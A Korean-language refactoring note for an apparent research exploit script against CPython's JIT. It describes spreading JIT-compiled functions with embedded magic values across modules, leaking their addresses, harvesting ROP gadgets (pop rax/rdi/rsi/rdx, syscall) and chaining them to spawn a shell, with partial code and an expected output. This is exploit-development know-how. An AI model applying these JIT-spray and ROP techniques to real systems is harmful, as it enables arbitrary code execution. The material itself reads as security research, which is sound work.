# gadget_chain_parallel.py 리팩토링 요약

## 🔄 주요 변경사항

### Before (Multiprocessing 방식)
```python
from multiprocessing import Pool, Manager

def worker_task(args):
    """각 worker가 독립된 프로세스에서 실행"""
    seed, magic_value, gadgets_needed = args
    jit_func = generate_jit_func_named(seed, magic_value)
    # Warm up & scan in separate process
    ...
    return found_gadgets  # ⚠️ 이 주소는 worker 프로세스에서만 유효!

with Pool(processes=num_workers) as pool:
    results = pool.map(worker_task, tasks)
```

**문제점**:
- ❌ Worker 프로세스의 JIT 메모리는 Main 프로세스에서 접근 불가
- ❌ 발견한 gadget 주소가 ROP chain 실행 시 Segmentation Fault
- ❌ 결국 libc나 shellcode로 대체해야 함

### After (Spread Allocation 방식)
```python
import types  # Module 생성용

def generate_spread_jit_functions(num_functions, gadgets_needed):
    """같은 프로세스 내에서 넓은 주소 영역에 분산"""
    num_modules = min(10, num_functions)
    
    for mod_idx in range(num_modules):
        # 새 모듈 생성
        module = types.ModuleType(f"jit_spread_module_{mod_idx}")
        
        for i in range(funcs_per_module):
            jit_func = generate_jit_func_named(global_idx, magic_value)
            setattr(module, f"func_{i}", jit_func)  # 모듈에 등록
            
            # Warm up & scan in SAME process
            for j in range(5000):
                jit_func(j)
            
            jit_addr, size = jitexecleak.leak_executor_jit(jit_func)
            # ✅ 이 주소는 현재 프로세스에서 유효!
            
        # 1MB 더미로 메모리 경계 강제
        dummy = bytearray(1024 * 1024)
    
    return all_gadgets, modules
```

**장점**:
- ✅ 모든 gadget 주소가 같은 프로세스에서 유효
- ✅ ROP chain 실행 시 Segmentation Fault 없음
- ✅ JIT gadget만으로 완전한 ROP chain 구성 가능
- ✅ 넓은 주소 공간 분산 → patch_64 값 다양화

## 📊 예상 메모리 레이아웃

```
단일 프로세스 메모리 공간:

[Module 0]
  ├─ Function 0  JIT @ 0x7f1234560000
  └─ [1MB Dummy] ← 메모리 경계 강제!
  
[Module 1]
  ├─ Function 1  JIT @ 0x7f1235600000  (다른 주소 영역!)
  └─ [1MB Dummy]
  
[Module 2]
  ├─ Function 2  JIT @ 0x7f1236700000  (더 먼 주소!)
  └─ [1MB Dummy]
  
...

[Module 6]
  └─ Function 6  JIT @ 0x7f123a900000

→ JIT 메모리 범위: ~6-7MB 분산
→ patch_64 주소 다양성: 높음
→ 모든 주소가 Main 프로세스에서 유효! ✅
```

## 🎯 핵심 개선사항

### 1. **주소 공간 분리**

| 방식 | 메모리 공간 | JIT 주소 유효성 | 주소 분산 |
|-----|-----------|---------------|----------|
| Multiprocessing | 7개 독립 프로세스 | ❌ Main에서 무효 | 매우 넓음 (GB) |
| **Spread (New)** | **1개 프로세스** | **✅ 모두 유효** | **넓음 (MB)** |
| Sequential | 1개 프로세스 | ✅ 모두 유효 | 좁음 (KB) |

### 2. **Gadget 발견 및 사용**

**Multiprocessing 방식**:
```
Worker 0: pop_rax @ 0x7f1234560000  ❌ Main에서 무효
Worker 1: pop_rdi @ 0x7f9876540000  ❌ Main에서 무효
...
→ libc fallback 필요!
```

**Spread 방식** (현재):
```
Module 0: pop_rax @ 0x7f1234560000  ✅ Main에서 유효
Module 1: pop_rdi @ 0x7f1235600000  ✅ Main에서 유효
Module 2: pop_rsi @ 0x7f1236700000  ✅ Main에서 유효
...
→ JIT gadget만으로 ROP chain 구성 가능!
```

### 3. **patch_64 주소 다양성**

```python
# Sequential: 모든 함수가 비슷한 주소
Function 0: JIT @ 0x7f1234560000
Function 1: JIT @ 0x7f1234561000  (+4KB)
Function 2: JIT @ 0x7f1234562000  (+4KB)
→ patch_64 주소 범위: 좁음

# Spread: 모듈 간 1MB 간격
Module 0: JIT @ 0x7f1234560000
[1MB Dummy]
Module 1: JIT @ 0x7f1235600000  (+~16MB!)
[1MB Dummy]
Module 2: JIT @ 0x7f1236700000  (+~17MB!)
→ patch_64 주소 범위: 넓음 → 더 다양한 unintended instruction!
```

## 🚀 예상 효과

### 기존 (Sequential):
- 7개 함수, 연속 할당
- JIT 메모리: ~28KB (7 × 4KB)
- patch_64 주소: 좁은 범위
- Gadget 종류: 기본

### 개선 (Spread):
- 7개 함수, 7개 모듈, 1MB 간격
- JIT 메모리: ~7MB 분산
- patch_64 주소: 넓은 범위
- Gadget 종류: **2-3배 증가 예상** (PATCH_GADGET_ANALYSIS.md 가설)

## ✅ 검증 계획

1. **실행 전 확인**:
   - 코드가 정상 컴파일되는가?
   - 7개 모듈이 생성되는가?

2. **실행 중 모니터링**:
   - JIT 컴파일 성공률
   - 각 모듈의 JIT 주소 범위
   - Gadget 발견 개수

3. **실행 후 분석**:
   - JIT gadget vs libc gadget 비율
   - ROP chain이 JIT gadget만 사용하는가?
   - Shell 실행 성공하는가?

## 📝 실행 명령어

```bash
cd /home/mobileos2/cpython/case_studies/case4
python3 gadget_chain_parallel.py
```

**예상 출력**:
```
======================================================================
SPREAD ALLOCATION STRATEGY
======================================================================
Goal: Distribute JIT code across wide address space
Method: Multiple modules + 1MB dummy boundaries
Benefit: Diverse patch_64 values → More unintended instructions
======================================================================

[*] Generating 7 functions across 7 modules...
[*] Strategy: Spread allocation in same process

[Module 0] Creating module with 1 functions...
  [0.0] Generating function with magic 0x000000C3...
  [0.0] Warming up...
  [0.0] ✓ JIT @ 0x7f1234560000, size: 192512
  [0.0] Found gadget: pop rax @ 0x7f1234560123
  [0.0] Found gadget: pop rdi @ 0x7f1234560456
...

[+] JIT gadgets collected: 5

[+] All gadgets found in JIT! No need for libc search.

=== [ All Found Gadgets ] ===
[+] pop rax     => 0x7f1234560123
[+] pop rdi     => 0x7f1235600456
[+] pop rsi     => 0x7f1236700789
[+] pop rdx     => 0x7f1237800abc
[+] syscall     => 0x7f1238900def

=== [ ROP Stack Layout ] ===
...

Press Enter to execute ROP chain...
[Shell 실행 성공!] 🎉
```
